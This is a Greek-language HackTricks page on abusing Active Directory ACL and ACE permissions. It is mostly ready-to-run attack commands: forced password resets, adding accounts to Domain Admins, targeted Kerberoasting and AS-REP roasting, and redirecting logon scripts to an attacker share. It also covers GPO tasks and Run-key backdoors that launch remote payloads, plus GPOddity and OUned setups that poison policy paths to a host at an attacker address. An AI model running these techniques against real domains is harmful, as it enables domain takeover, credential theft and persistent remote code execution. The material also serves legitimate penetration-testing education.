# Κατάχρηση των ACLs/ACEs του Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια σύνοψη των τεχνικών από τα** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, δείτε τα αρχικά άρθρα.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Δικαιώματα GenericAll σε χρήστη**

Αυτό το προνόμιο παρέχει στον attacker πλήρη έλεγχο ενός λογαριασμού-στόχου. Αφού επιβεβαιωθούν τα δικαιώματα `GenericAll` με την εντολή `Get-ObjectAcl`, ο attacker μπορεί να:

- **Αλλάξει τον κωδικό πρόσβασης του στόχου**: Με την εντολή `net user <username> <password> /domain`, ο attacker μπορεί να επαναφέρει τον κωδικό πρόσβασης του χρήστη.
- Από Linux, μπορείς να κάνεις το ίδιο μέσω SAMR με το Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Αν ο λογαριασμός είναι απενεργοποιημένος, καταργήστε τη σημαία UAC**: Το `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από Linux, το BloodyAD μπορεί να καταργήσει τη σημαία `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Αναθέστε ένα SPN στον λογαριασμό του χρήστη ώστε να γίνει kerberoastable και, στη συνέχεια, χρησιμοποιήστε τα Rubeus και targetedKerberoast.py για να εξαγάγετε τα hashes του ticket-granting ticket (TGT) και να επιχειρήσετε να τα σπάσετε.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Στοχευμένο ASREPRoasting**: Απενεργοποιήστε τον προέλεγχο ταυτότητας για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Με `GenericAll` σε έναν χρήστη, μπορείτε να προσθέσετε ένα credential βασισμένο σε πιστοποιητικό και να κάνετε authenticate ως αυτός, χωρίς να αλλάξετε τον κωδικό πρόσβασής του. Δείτε:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Δικαιώματα GenericAll σε ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει τη συμμετοχή σε ομάδες, αν έχει δικαιώματα `GenericAll` σε μια ομάδα, όπως η `Domain Admins`. Αφού εντοπίσει το distinguished name της ομάδας με το `Get-NetGroup`, ο επιτιθέμενος μπορεί να:

- **Προσθέσει τον εαυτό του στην ομάδα Domain Admins**: Αυτό μπορεί να γίνει με απευθείας εντολές ή με χρήση modules όπως τα Active Directory ή PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Από Linux μπορείτε επίσης να αξιοποιήσετε το BloodyAD για να προσθέσετε τον εαυτό σας σε οποιαδήποτε ομάδα, όταν έχετε δικαιώματα GenericAll/Write σε αυτήν. Αν η ομάδα-στόχος είναι ένθετη στην ομάδα «Remote Management Users», θα αποκτήσετε αμέσως πρόσβαση WinRM σε hosts που αναγνωρίζουν αυτήν την ομάδα:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write σε Computer/User**

Η κατοχή αυτών των προνομίων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει τα εξής:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την κατάληψη ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτήν την τεχνική για να υποδυθείτε έναν λογαριασμό υπολογιστή ή χρήστη, εκμεταλλευόμενοι τα προνόμια για τη δημιουργία shadow credentials.

## Μετακίνηση ενός αντικειμένου σε OU με κληρονομημένα δικαιώματα

Μια διαδρομή μπορεί να συνδυάζει **δικαιώματα μετακίνησης ενός λογαριασμού** με **δικαιώματα εγγραφής που κληρονομούνται από ένα OU προορισμού**, ακόμη κι όταν κανένας principal δεν μπορεί αρχικά να τροποποιήσει τα ευαίσθητα χαρακτηριστικά του λογαριασμού. Επαληθεύστε τα δικαιώματα μετακίνησης του αντικειμένου προέλευσης και το `CreateChild` στον προορισμό, μετακινήστε το αντικείμενο και, στη συνέχεια, ελέγξτε ξανά την αποτελεσματική DACL του. Για παράδειγμα, το `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` του powerview.py μετακινεί τον χρήστη· έπειτα, μια ελεγχόμενη ομάδα με κληρονομημένο `GenericWrite` σε αυτό το OU μπορεί να προσθέσει ένα [shadow credential](shadow-credentials.md). Η μετακίνηση από μόνη της δεν δημιουργεί το κληρονομημένο δικαίωμα.<sup>[[18]](#references)</sup>

Αν έχετε `GenericAll` σε ένα OU, αλλά δεν υπάρχει κατάλληλο κληρονομημένο ACE, το `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` μπορεί να προσθέσει ένα για τους απογόνους του. Ελέγξτε ξεχωριστά τον λογαριασμό-στόχο: **στους λογαριασμούς που προστατεύονται από το AdminSDHolder είναι απενεργοποιημένη η κληρονομικότητα**, επομένως ένα ACE του OU μπορεί να επηρεάζει απλούς χρήστες, αλλά να μην εφαρμόζεται σε έναν προστατευμένο χρήστη. Δείτε [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Υπάρχει ξεχωριστή διαδρομή κατάχρησης όταν ένα προνομιούχο script προγραμματισμένου καθαρισμού επιλέγει OU βάσει ACE που επηρεάζονται από τον επιτιθέμενο και, στη συνέχεια, εκτελεί `Set-ADObject -Clear adminCount` **και** `$acl.SetAccessRuleProtection($False, $False)` στους απογόνους τους. Αν μπορείτε να τροποποιήσετε την DACL του OU, παραχωρήστε στην ομάδα που ελέγχει το script το απαιτούμενο ACE `ExtendedRight` ή `GenericAll`· επαληθεύστε ξεχωριστά ότι μπορείτε να εκκινήσετε την εργασία. Η προνομιούχα εργασία μπορεί τότε να επαναφέρει την κληρονομικότητα σε έναν προηγουμένως προστατευμένο λογαριασμό, επιτρέποντας την εφαρμογή του ACE του OU. Επιβεβαιώστε το ακριβές script, το δικαίωμα ενεργοποίησης και την DACL που προκύπτει· η εκκαθάριση του `adminCount` από μόνη της δεν ενεργοποιεί ξανά την κληρονομικότητα, ενώ το SDProp μπορεί να επαναπροστατεύσει λογαριασμούς που παραμένουν σε προστατευμένες ομάδες.<sup>[[18]](#references)</sup>

## **WriteProperty σε Group**

Αν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα μιας συγκεκριμένης ομάδας (π.χ. `Domain Admins`), μπορεί να:

- **Προσθέσει τον εαυτό του στην ομάδα Domain Admins**: Αυτό μπορεί να επιτευχθεί με συνδυασμό των εντολών `net user` και `Add-NetGroupUser` και επιτρέπει την κλιμάκωση προνομίων εντός του domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) σε ομάδα**

Αυτό το προνόμιο επιτρέπει στους επιτιθέμενους να προσθέτουν τους εαυτούς τους σε συγκεκριμένες ομάδες, όπως η `Domain Admins`, χρησιμοποιώντας εντολές που τροποποιούν απευθείας τη συμμετοχή σε ομάδες. Η ακόλουθη ακολουθία εντολών επιτρέπει την προσθήκη του εαυτού τους:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ένα παρόμοιο προνόμιο, που επιτρέπει στους επιτιθέμενους να προσθέτουν απευθείας τους εαυτούς τους σε ομάδες, τροποποιώντας τις ιδιότητες των ομάδων, εφόσον έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτού του προνομίου πραγματοποιούνται με:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών πρόσβασης χωρίς να είναι γνωστός ο τρέχων κωδικός. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, παρέχοντας διάφορες μεθόδους επαναφοράς του κωδικού πρόσβασης ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και one-liners για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, καταδεικνύοντας την ευελιξία των διανυσμάτων επίθεσης.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner σε ομάδα**

Αν ένας attacker διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει τον ιδιοκτήτη της ομάδας και να ορίσει τον εαυτό του. Αυτό έχει ιδιαίτερα σημαντικό αντίκτυπο όταν η εν λόγω ομάδα είναι η `Domain Admins`, καθώς η αλλαγή ιδιοκτήτη παρέχει ευρύτερο έλεγχο στα χαρακτηριστικά και τα μέλη της ομάδας. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού αντικειμένου μέσω του `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για την αλλαγή του ιδιοκτήτη, είτε με SID είτε με όνομα.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite σε χρήστη**

Αυτή η άδεια επιτρέπει σε έναν εισβολέα να τροποποιήσει τις ιδιότητες ενός χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο εισβολέας μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη, ώστε να εκτελείται ένα κακόβουλο script κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται με τη χρήση της εντολής `Set-ADObject` για την ενημέρωση της ιδιότητας `scriptpath` του χρήστη-στόχου, ώστε να δείχνει στο script του εισβολέα.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Ένα πιο περιορισμένο ACE `WriteProperty`, με scope στο attribute [`scriptPath` του χρήστη](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), μπορεί να αρκεί· δεν απαιτείται `GenericWrite`. Συνδυάστε αυτό το δικαίωμα στο attribute με ένα εγγράψιμο script στο δέντρο `SYSVOL\<domain>\scripts` ή `NETLOGON` του domain και, στη συνέχεια, αξιολογήστε αν είναι πιθανό ο χρήστης-στόχος να συνδεθεί και να εκτελέσει το script. Το script εκτελείται στο πλαίσιο του συγκεκριμένου χρήστη κατά τη σύνδεση. Ελέγξτε χωριστά τα αποτελεσματικά ACL του AD και των αρχείων/κοινόχρηστων πόρων· ένα αντίστοιχο Allow ACE ή ένας εγγράψιμος κατάλογος από μόνο του δεν αποδεικνύει ότι υπάρχει πλήρης διαδρομή.

## **GenericWrite σε Group**

Με αυτό το προνόμιο, οι attackers μπορούν να χειριστούν τη συμμετοχή σε ομάδες, για παράδειγμα προσθέτοντας τους εαυτούς τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Η διαδικασία περιλαμβάνει τη δημιουργία ενός credential object, τη χρήση του για την προσθήκη ή την αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών συμμετοχής με εντολές PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Από Linux, το Samba `net` μπορεί να προσθέτει/αφαιρεί μέλη όταν έχεις δικαίωμα `GenericWrite` στην ομάδα (χρήσιμο όταν δεν είναι διαθέσιμα τα PowerShell/RSAT):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και τα προνόμια `WriteDACL` σε αυτό επιτρέπουν σε έναν attacker να παραχωρήσει στον εαυτό του προνόμια `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού του ADSI, παρέχοντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης των μελών των ομάδων του. Παρ’ όλα αυτά, υπάρχουν περιορισμοί κατά την προσπάθεια εκμετάλλευσης αυτών των προνομίων με τα cmdlets `Set-Acl` / `Get-Acl` του module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Ταχεία κατάληψη μέσω WriteDACL/WriteOwner (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` σε έναν χρήστη ή λογαριασμό υπηρεσίας, μπορείτε να αποκτήσετε πλήρη έλεγχο και να επαναφέρετε τον κωδικό πρόσβασής του χρησιμοποιώντας το PowerView, χωρίς να γνωρίζετε τον παλιό κωδικό πρόσβασης:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Σημειώσεις:
- Ίσως χρειαστεί πρώτα να αλλάξετε τον κάτοχο σε εσάς, αν έχετε μόνο WriteOwner:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Επαληθεύστε την πρόσβαση με οποιοδήποτε πρωτόκολλο (SMB/LDAP/RDP/WinRM) μετά την επαναφορά του κωδικού πρόσβασης.

## **Αναπαραγωγή στον τομέα (DCSync)**

Η επίθεση DCSync αξιοποιεί συγκεκριμένα δικαιώματα αναπαραγωγής στον τομέα για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως το `DS-Replication-Get-Changes`, επιτρέποντας στους επιτιθέμενους να εξαγάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε Domain Controller.<sup>[[5]](#references)</sup> [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η εκχωρημένη πρόσβαση για τη διαχείριση Group Policy Objects (GPOs) μπορεί να δημιουργήσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` έχουν εκχωρηθεί δικαιώματα διαχείρισης GPO, μπορεί να διαθέτει προνόμια όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να αξιοποιηθούν για κακόβουλους σκοπούς, όπως εντοπίστηκε με τη χρήση του PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Απαρίθμηση δικαιωμάτων GPO

Για τον εντοπισμό εσφαλμένα ρυθμισμένων GPO, μπορούν να συνδυαστούν τα cmdlets του PowerSploit. Έτσι, εντοπίζονται τα GPO που έχει δικαίωμα να διαχειρίζεται ένας συγκεκριμένος χρήστης: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Υπολογιστές στους οποίους εφαρμόζεται μια συγκεκριμένη πολιτική**: Μπορείτε να εντοπίσετε σε ποιους υπολογιστές εφαρμόζεται ένα συγκεκριμένο GPO, ώστε να κατανοήσετε την πιθανή έκταση του αντίκτυπου. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Πολιτικές που εφαρμόζονται σε συγκεκριμένο υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορείτε να χρησιμοποιήσετε εντολές όπως το `Get-DomainGPO`.

**OU στις οποίες εφαρμόζεται μια συγκεκριμένη πολιτική**: Μπορείτε να εντοπίσετε τις οργανωτικές μονάδες (OU) που επηρεάζονται από μια συγκεκριμένη πολιτική χρησιμοποιώντας το `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για να απαριθμήσετε GPO και να εντοπίσετε προβλήματα σε αυτά.

### Κατάχρηση GPO - New-GPOImmediateTask

Τα εσφαλμένα ρυθμισμένα GPO μπορούν να αξιοποιηθούν για την εκτέλεση κώδικα, για παράδειγμα, με τη δημιουργία μιας άμεσης προγραμματισμένης εργασίας. Αυτό μπορεί να χρησιμοποιηθεί για την προσθήκη ενός χρήστη στην τοπική ομάδα διαχειριστών στους επηρεαζόμενους υπολογιστές, αυξάνοντας σημαντικά τα προνόμιά του:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Το module GroupPolicy, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPO, καθώς και τον ορισμό προτιμήσεων, όπως τιμών μητρώου, για την εκτέλεση backdoors στους υπολογιστές που επηρεάζονται. Για την εκτέλεση αυτής της μεθόδου απαιτείται να ενημερωθεί το GPO και να συνδεθεί ένας χρήστης στον υπολογιστή:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει έναν τρόπο κατάχρησης υπαρχόντων GPO, προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς να απαιτείται η δημιουργία νέων GPO. Αυτό το εργαλείο απαιτεί την τροποποίηση υπαρχόντων GPO ή τη χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή των αλλαγών:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Επιβολή ενημέρωσης πολιτικής

Οι ενημερώσεις GPO πραγματοποιούνται συνήθως περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορείτε να εκτελέσετε την εντολή `gpupdate /force` στον υπολογιστή-στόχο, ώστε να επιβάλετε άμεση ενημέρωση πολιτικής. Έτσι, τυχόν τροποποιήσεις στις GPO εφαρμόζονται χωρίς να χρειάζεται να περιμένετε τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Στο παρασκήνιο

Εξετάζοντας τις προγραμματισμένες εργασίες μιας GPO, όπως την `Misconfigured Policy`, μπορείτε να επιβεβαιώσετε ότι προστέθηκαν εργασίες όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών, με στόχο την τροποποίηση της συμπεριφοράς του συστήματος ή την κλιμάκωση προνομίων.

Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που δημιουργείται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας, συμπεριλαμβανομένων της εντολής που θα εκτελεστεί και των εναυσμάτων της. Αυτό το αρχείο δείχνει πώς ορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες μέσα στις GPO και παρέχει έναν τρόπο εκτέλεσης αυθαίρετων εντολών ή scripts στο πλαίσιο της επιβολής πολιτικών.

### Χρήστες και ομάδες

Οι GPO επιτρέπουν επίσης την τροποποίηση των συμμετοχών χρηστών και ομάδων στα συστήματα-στόχους. Με άμεση επεξεργασία των αρχείων πολιτικής Users and Groups, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως στην τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, η οποία επιτρέπει την τροποποίηση αρχείων πολιτικής, ώστε να συμπεριληφθούν νέοι χρήστες ή να αλλάξουν οι συμμετοχές σε ομάδες.

Το αρχείο διαμόρφωσης XML για τους χρήστες και τις ομάδες περιγράφει τον τρόπο υλοποίησης αυτών των αλλαγών. Με την προσθήκη εγγραφών σε αυτό το αρχείο, μπορούν να παραχωρηθούν αυξημένα δικαιώματα σε συγκεκριμένους χρήστες σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει έναν άμεσο τρόπο κλιμάκωσης προνομίων μέσω χειραγώγησης GPO.

Για ρυθμίσεις ασφαλείας, όπως η συμμετοχή σε τοπικές ομάδες και τα δικαιώματα χρηστών, ελέγξτε επίσης το εφαρμοσμένο πρότυπο GPO στη διαδρομή `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` και τα ACL του καταλόγου `SecEdit`. Ένας εγγράψιμος κατάλογος ή αρχείο αποτελεί ένδειξη για περαιτέρω έλεγχο: η πραγματική πρόσβαση στο κοινόχρηστο στοιχείο SYSVOL, τα ACL άρνησης και κληρονομημένα ACL, τα δικαιώματα του κοντέινερ Group Policy, το πεδίο εφαρμογής της πολιτικής και η ανανέωση από τον client εξακολουθούν να καθορίζουν αν μια αλλαγή μπορεί να τεθεί σε ισχύ. Η συμμετοχή σε μια ομάδα με όνομα “GPO Managers” από μόνη της δεν αποδεικνύει ότι υπάρχουν δικαιώματα επεξεργασίας. [Η Microsoft τεκμηριώνει αυτή τη διαδρομή προτύπου και τον διαχωρισμό μεταξύ κοντέινερ και προτύπου Group Policy.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Επιπλέον, μπορούν να εξεταστούν και άλλες μέθοδοι εκτέλεσης κώδικα ή διατήρησης persistence, όπως η αξιοποίηση scripts σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών μητρώου για autoruns, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία διαμορφώσεων υπηρεσιών. Αυτές οι τεχνικές προσφέρουν διάφορους τρόπους διατήρησης της πρόσβασης και ελέγχου συστημάτων-στόχων μέσω κατάχρησης των GPO.

### Ανακατεύθυνση της ανάκτησης GPC/GPT σε rogue υπηρεσίες με έλεγχο ταυτότητας

Μια GPO αποτελείται από ένα LDAP **Group Policy Container (GPC)** με μεταδεδομένα και ένα φιλοξενούμενο σε SMB **Group Policy Template (GPT)** με τα αρχεία πολιτικής. Κατά την ανανέωση, ο client ακολουθεί το `gPLink` του κοντέινερ, διαβάζει το αναφερόμενο GPC και το `gPCFileSysPath` του και, στη συνέχεια, κατεβάζει το GPT από αυτήν τη διαδρομή UNC. Κατά συνέπεια, η πρόσβαση εγγραφής είτε στο ίδιο το GPC είτε στο `gPLink` ενός OU, Site ή Domain μπορεί να αξιοποιηθεί για την εκτέλεση προνομιούχας επεξεργασίας πολιτικών.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Δηλητηρίαση του `gPCFileSysPath` με GPOddity

Αν η ελεγχόμενη principal μπορεί να γράψει στο GPC-στόχο (άμεσα ή μέσω **NTLM relay to LDAP**), αντικαταστήστε το `gPCFileSysPath` με μια διαδρομή UNC που φιλοξενείται από τον επιτιθέμενο. Το [GPOddity](https://github.com/synacktiv/GPOddity) αυτοματοποιεί την αλλαγή LDAP και φιλοξενεί ένα κακόβουλο GPT που περιέχει αρχεία πολιτικής βασισμένα σε modules ή μια Immediate Task, την οποία ο client Group Policy εκτελεί ως `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Ένα ανώνυμο κοινόχρηστο στοιχείο SMB ή ένα στοιχείο που δεν απαιτεί διαπιστευτήρια δεν αρκεί σε σύγχρονους clients Windows: το SMB Secure Negotiate απαιτεί απόδειξη επιτυχούς ελέγχου ταυτότητας, επομένως η rogue υπηρεσία πρέπει να επικυρώνει την ταυτότητα τομέα, να παράγει το κλειδί συνεδρίας SMB και να υπογράφει σωστά τις αποκρίσεις της. Στην ενσωματωμένη λειτουργία, διαμορφώστε το GPOddity με έναν ελεγχόμενο λογαριασμό μηχανήματος και το κλειδί υπηρεσίας του και, στη συνέχεια, επιλέξτε ένα payload πλευράς υπολογιστή ή χρήστη στην ενότητα `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Ακραία περίπτωση GPO χρήστη:** μετά το MS16-072, τα Windows εξακολουθούν να δημιουργούν δύο SMB2 sessions στην **ίδια TCP σύνδεση**: το user session διαβάζει το `GPT.INI` και στη συνέχεια το computer-account session διαβάζει την ενεργή διαμόρφωση, όπως το `ScheduledTasks.xml`. Επομένως, ένας κακόβουλος server πρέπει να ευρετηριάζει την κατάσταση authentication, τα session keys και τα signing keys με βάση το SMB2 `SessionId` και όχι μόνο το socket. Το Scapy fork που ενσωματώνεται στα GPOddity/OUned υλοποιεί αυτόν τον μηχανισμό μέσω των `SMBStreamSocketMultiplexing` και ενός `SMBServer` που υποστηρίζει multiplexing· διαφορετικά, οι single-session servers των Impacket/Scapy επαναχρησιμοποιούν τη λάθος κατάσταση signing και αποτυγχάνουν σε user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning με OUned

Με `WriteGPLink`, `GenericWrite` ή ισοδύναμο έλεγχο σε ένα OU, Site ή Domain, ένας attacker μπορεί να προσθέσει έναν σύνδεσμο του οποίου το GPC DN εξυπηρετείται από έναν LDAP host υπό τον έλεγχο του attacker. Αυτή η τεχνική παρουσιάστηκε αρχικά από τον Petros Koutroumpis· το [OUned](https://github.com/synacktiv/OUned) αυτοματοποιεί την εγγραφή LDAP και την αλυσίδα κακόβουλου GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
